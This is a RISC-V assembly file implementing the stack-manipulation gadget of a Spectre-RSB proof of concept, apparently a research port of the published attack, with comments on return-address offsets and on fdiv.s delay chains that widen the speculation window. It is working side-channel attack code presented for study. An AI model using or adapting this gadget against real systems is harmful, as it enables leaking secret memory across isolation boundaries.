.section .text
.globl swStackGadget

swStackGadget:
	# Note that these assembly codes manipulates software stack, not hardware RAS (return address stack).
	# Caller address stacking into RAS is instantly and automatically implemented by the processor.
	# Spectre-RSB exploits the mismatch (which cause a "speculation window") between software stack and RAS.
	
	# Knowledge:
	# The stack grows downwards (smaller memory address gets higher up).
	# Decreasing the stack pointer sp allocates space on the stack, whereas increasing it deallocates space.
	# Initially the sp (stack pointer) points to the next available memory location on the stack,
	# and the s0 or fp (frame pointer) points to the base of the stack frame.
	# "d" in "ld" and "sd" stands for "double". A word in RISC-V is 32 bits, so double -> 64bits.
	# ld ra, 40(sp) means load previous value (sp+40).

	# Offsets of "ra" and "sp" need to be adjusted according to rows of function "victimFunc" in the C languuage source codes.
	# There CACHE_HIT_THRESHOLD is also determined by delays in this assembly code file.
	# You should draw a stack figure before modifying these values.
	# |==================|
	# |------------------|
	# |------------------|
	# |------------------|
	# |------------------|

	# In the original paper, on an x86 processor operations are "pop off stack frame and get return address".
	# Since RISC-V does not specify stack instructions, such operations are achieved by rearranging ra, sp and fp.

	# Original version.
#	addi sp, sp, -16 # Allocate 16 bytes on the stack.
#	sd ra, 8(sp) # Store the ra to somewhere else in memory. This is actually not necessary.
#	ld ra, 40(sp) # Points ra to ra = sp1 + 40 = sp0 - 16 + 24
#	addi sp, sp, 48 # Points sp to sp2 = sp0 -16 + 48 = sp0 + 32

	# Simplified version.
	ld ra, 24(sp)
 	addi sp, sp, 32

	# This delays the result of ra to be used for the ret (a pseudoinstruction of "jalr zero, ra, 0"),
	# which imitates "cflush (%rsp)" that requires relatively long time to fetch values from the main memory in the original Spectre-RSB paper.
	# Thus in theory, there should be a flush function written in assembly codes instead of these left-shifting and division operations, 
	# but it seems that nobody wants to take hassles to write one.
	# Increase or decrease "slli" value and number of "fdiv.s" rows to fit accuracy of different implementations.
	addi ra, ra, -2
	addi t1, zero, 2
	slli t2, t1, 0x18 # This value determines the number of "fdiv.s" rows.
	fcvt.s.lu fa4, t1
	fcvt.s.lu fa5, t2
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fdiv.s fa5, fa5, fa4
	fcvt.lu.s t2, fa5, rtz
	add ra, ra, t2

	# Return to main function.
	ret
